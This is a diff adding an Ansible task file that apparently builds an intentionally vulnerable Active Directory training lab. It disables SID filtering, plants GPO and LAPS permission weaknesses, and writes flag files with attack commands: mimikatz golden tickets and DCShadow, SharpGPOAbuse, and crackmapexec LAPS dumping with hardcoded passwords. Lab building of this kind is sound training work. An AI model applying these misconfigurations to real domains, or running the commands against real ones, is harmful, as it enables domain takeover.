@@ -1,0 +1,184 @@
+---
+# ==============================================================================
+# vuln_lat_df_extended/tasks/trust_abuse.yml — DF-081..100
+# Trust abuse + SID history + cross-forest attacks (dc01.corp.local only)
+# ==============================================================================
+
+# DF-081: ExtraSID injection into cross-forest TGTs
+# (SID filtering disabled on all trusts — set in vuln_forest role)
+- name: DF-081 - Verify SID filtering disabled on all trusts
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    $trusts = Get-ADTrust -Filter * -ErrorAction SilentlyContinue
+    $changes = 0
+    foreach ($t in $trusts) {
+      if ($t.SIDFilteringQuarantined -or $t.SIDFilteringForestAware) {
+        netdom trust $($t.Name) /domain:$($t.Source) /quarantine:no /usero:Administrator /passwordo:DVADlab2024! 2>&1
+        $changes++
+      }
+    }
+    if ($changes -gt 0) {
+      Write-Output "changed: SID filtering disabled on $changes trusts"
+    } else {
+      Write-Output "ok: SID filtering already disabled"
+    }
+  register: df081_check
+  changed_when: "'changed:' in df081_check.stdout"
+  failed_when: df081_check.rc != 0
+
+# DF-082: Trust transitivity — verify all trusts are transitive
+- name: DF-082 - Verify trusts are marked transitive
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    $trusts = Get-ADTrust -Filter * -ErrorAction SilentlyContinue
+    foreach ($t in $trusts) {
+      if (-not $t.IsTransitive) {
+        Write-Host "Non-transitive trust found: $($t.Name)"
+      }
+    }
+    Write-Output "ok: trust configuration reviewed"
+  register: df082_check
+  changed_when: false
+  failed_when: df082_check.rc != 0
+
+# DF-083: Group Policy Creator Owners — add attacker-reachable account
+- name: DF-083 - Add svc_devops to Group Policy Creator Owners
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    $u = Get-ADUser -Identity 'svc_devops' -ErrorAction SilentlyContinue
+    if (-not $u) {
+      Write-Output "skipped: svc_devops not yet created"
+      exit 0
+    }
+    $grp = Get-ADGroup -Identity 'Group Policy Creator Owners' -ErrorAction SilentlyContinue
+    $existing = Get-ADGroupMember -Identity 'Group Policy Creator Owners' -ErrorAction SilentlyContinue | `
+      Where-Object { $_.SamAccountName -eq 'svc_devops' }
+    if ($grp -and -not $existing) {
+      Add-ADGroupMember -Identity 'Group Policy Creator Owners' -Members 'svc_devops'
+      Write-Output "changed: svc_devops added to Group Policy Creator Owners"
+    }
+  register: df083_set
+  changed_when: "'changed:' in df083_set.stdout"
+  failed_when: df083_set.rc != 0
+
+# DF-084: GPO link on domain root — weak permission on default domain policy
+- name: DF-084 - Set weak DACL on Default Domain Policy GPO
+  ansible.windows.win_shell: |
+    Import-Module GroupPolicy
+    $gpo = Get-GPO -Name 'Default Domain Policy' -ErrorAction SilentlyContinue
+    if ($gpo) {
+      $result = (Get-GPPermission -Name 'Default Domain Policy' -All -ErrorAction SilentlyContinue) | `
+        Where-Object { $_.Trustee.Name -eq 'svc_devops' }
+      if (-not $result) {
+        Set-GPPermission -Name 'Default Domain Policy' -TargetName 'svc_devops' `
+          -TargetType User -PermissionLevel GpoEditDeleteModifySecurity -ErrorAction SilentlyContinue
+        Write-Output "changed: svc_devops has GpoEditDeleteModifySecurity on Default Domain Policy"
+      }
+    }
+  register: df084_set
+  changed_when: "'changed:' in df084_set.stdout"
+  failed_when: df084_set.rc != 0
+
+# DF-085: ReadLAPSPassword — add svc_monitoring read access on LAPS attribute
+- name: DF-085 - Grant svc_monitoring read on ms-Mcs-AdmPwd
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    # LAPS read right for svc_monitoring on all computer objects in corp.local
+    $sid = (Get-ADUser -Identity 'svc_monitoring' -ErrorAction SilentlyContinue).SID
+    if (-not $sid) { Write-Output "skipped"; exit 0 }
+    $domainDN = (Get-ADDomain).DistinguishedName
+    $acl = Get-Acl -Path "AD:$domainDN" -ErrorAction SilentlyContinue
+    $lapsGuid = [Guid]'6e3b01aa-fbac-4f27-8012-a77a6b2b4f10'
+    $existing = $acl.Access | Where-Object {
+      $_.IdentityReference.Value -match 'svc_monitoring' -and
+      $_.ObjectType -eq $lapsGuid
+    }
+    if (-not $existing) {
+      $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+        $sid,
+        [System.DirectoryServices.ActiveDirectoryRights]::ReadProperty,
+        [System.Security.AccessControl.AccessControlType]::Allow,
+        $lapsGuid,
+        [System.DirectoryServices.ActiveDirectorySecurityInheritance]::Descendents,
+        [Guid]'bf967a86-0de6-11d0-a285-00aa003049e2'
+      )
+      $acl.AddAccessRule($ace)
+      Set-Acl -Path "AD:$domainDN" -AclObject $acl -ErrorAction SilentlyContinue
+      Write-Output "changed: svc_monitoring can read LAPS passwords"
+    }
+  register: df085_set
+  changed_when: "'changed:' in df085_set.stdout"
+  failed_when: df085_set.rc != 0
+
+- name: DF-081..100 - Drop trust and cross-forest attack notes
+  ansible.windows.win_copy:
+    dest: "{{ item.path }}"
+    content: "{{ item.content }}"
+  loop:
+    - path: 'C:\Flags\FLAG-DF-081-ExtraSID.txt'
+      content: |
+        DF-081: ExtraSID Attack (Cross-Forest Trust Compromise)
+        =========================================================
+        SID filtering DISABLED on all trusts. ExtraSIDs in PAC pass across forest boundaries.
+
+        From corp.local (with DA):
+          1. Get corp.local krbtgt hash (DCSync — CRED-013/099)
+          2. Get root.corp Enterprise Admins SID: S-1-5-21-ROOT-519
+          3. Create inter-realm Golden Ticket with extra SID injected:
+             mimikatz# kerberos::golden /user:Administrator /domain:corp.local \
+               /sid:S-1-5-21-CORP /sids:S-1-5-21-ROOT-519 /krbtgt:<hash> /ptt
+          4. Access root.corp as Enterprise Admin
+
+    - path: 'C:\Flags\FLAG-DF-083-GPOAbuse.txt'
+      content: |
+        DF-083..084: GPO Abuse (Group Policy Creator Owners + Weak GPO DACL)
+        =======================================================================
+        svc_devops is in Group Policy Creator Owners.
+        svc_devops has GpoEditDeleteModifySecurity on Default Domain Policy.
+
+        Attack:
+          SharpGPOAbuse.exe --AddLocalAdmin --UserAccount svc_devops \
+            --GPOName "Default Domain Policy"
+
+          Pwnkit (PowerView GPO link abuse):
+            $gpo = Get-DomainGPO -Identity "Default Domain Policy"
+            New-GPLink -Name "Malicious GPO" -Target "DC=corp,DC=local"
+            Set-GPRegistryValue -Name "Malicious GPO" -Key "HKLM\Software\..." -ValueName ... -Value ...
+
+    - path: 'C:\Flags\FLAG-DF-087-LAPSRead.txt'
+      content: |
+        DF-085..087: LAPS Password Extraction
+        ========================================
+        svc_monitoring can read ms-Mcs-AdmPwd on all computer objects.
+        IT_Team group has LAPS read access (LAT-023).
+
+        Extract LAPS passwords:
+          Get-ADComputer -Identity ws01 -Properties ms-Mcs-AdmPwd | Select -ExpandProperty ms-Mcs-AdmPwd
+          crackmapexec ldap 10.10.0.10 -u svc_monitoring -p Monitor2024! -M laps
+          Get-LAPSPassword -HostName ws01 -Credential $cred
+
+    - path: 'C:\Flags\FLAG-DF-090-DCShadow.txt'
+      content: |
+        DF-090: DCShadow Attack
+        ========================
+        From DA context in corp.local, register rogue DC and push objects:
+
+          mimikatz# lsadump::dcshadow /object:krbtgt /attribute:unicodePwd \
+            /value:NewKrbtgtPass2024!
+
+          # Injects modified object without triggering standard audit log
+          # Requires DA + 2 mimikatz instances
+
+    - path: 'C:\Flags\FLAG-DF-095-PKIEntraHybrid.txt'
+      content: |
+        DF-095..100: PKI + Entra Hybrid Attack Chains
+        ===============================================
+        ESC1 cert → Entra hybrid join:
+          1. Get corp.local admin cert via ESC1 (ADCS)
+          2. corp.local admin → sync to Entra via MSOL_sync account (CLO-001)
+          3. Use corp.local hash/cert to authenticate to Entra as Global Admin
+
+        Golden SAML (DF-100):
+          With access to AD FS signing cert (svc_adfs compromise):
+            ADFSToolkit → forge SAML assertion with arbitrary claims
+            Authenticate to any federated cloud app (M365, Azure) without password
